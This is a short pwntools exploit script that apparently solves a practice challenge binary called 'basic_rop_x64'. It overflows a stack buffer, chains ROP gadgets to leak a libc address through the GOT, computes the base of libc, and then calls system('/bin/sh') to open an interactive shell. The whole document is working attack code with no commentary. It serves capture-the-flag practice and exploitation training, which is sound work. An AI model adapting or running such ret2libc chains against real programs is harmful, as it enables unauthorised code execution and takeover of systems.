from pwn import *

p = process('basic_rop_x64', env = {"LD_PRELOAD" : "./libc.so.6"})
e = ELF('basic_rop_x64')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
main = e.symbols['main']

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']
sh = list(libc.search(b'/bin/sh'))[0]

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881

payload = b'A' * 0x40 + b'B' * 0x8
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)
payload += p64(main)

p.send(payload)
p.recvuntil(b'A' * 0x40)

read = u64(p.recvn(8))
lb = read - read_offset
system = lb + system_offset
binsh = sh+lb

payload = b'A'*0x48
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)

p.interactive()
